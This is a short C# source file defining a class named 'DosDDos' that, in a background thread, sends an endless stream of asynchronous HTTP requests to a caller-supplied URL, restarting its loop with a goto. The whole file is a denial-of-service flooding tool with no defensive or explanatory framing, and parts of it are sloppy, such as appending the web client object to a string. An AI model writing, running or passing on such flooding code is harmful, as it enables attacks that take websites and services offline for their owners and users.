using System;
using System.Threading;
using System.Net;
using System.Windows.Forms;

namespace PM4P
{
    class DosDDos
    {
        private string url;
        private string dt;
        
        public void getparam(string datatext, string urls)
        {
            url = urls;
            dt = datatext;
        }

        public string runfunction()
        {
            Thread obj = new Thread(threadfunctionattack);
            obj.IsBackground = true;
            obj.Start();
            return dt;
        }

        private void threadfunctionattack(Object obj)
        {
            try
            {
                ddos(url, dt);
            }
            catch
            {

            }
        }

        private void ddos(string urls, string datatext)
        {
            url = urls;

            try
            {
                HERE:
                for (int j = 0; j < 100; ++j)
                {
                    j = 0;
                    for (Int64 i = 0; i < 99999999; ++i)
                    {
                        var client = new WebClient();
                        client.DownloadStringAsync(new Uri(url));
                        dt += client;
                        client.Dispose();
                        dt += client;
                    }
                    Thread.Sleep(1000);
                }
                goto HERE;
            }
            catch(InsufficientMemoryException iEx)
            {
                MessageBox.Show(iEx.Message, iEx.StackTrace);
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message, ex.StackTrace);
            }
        }
    }
}
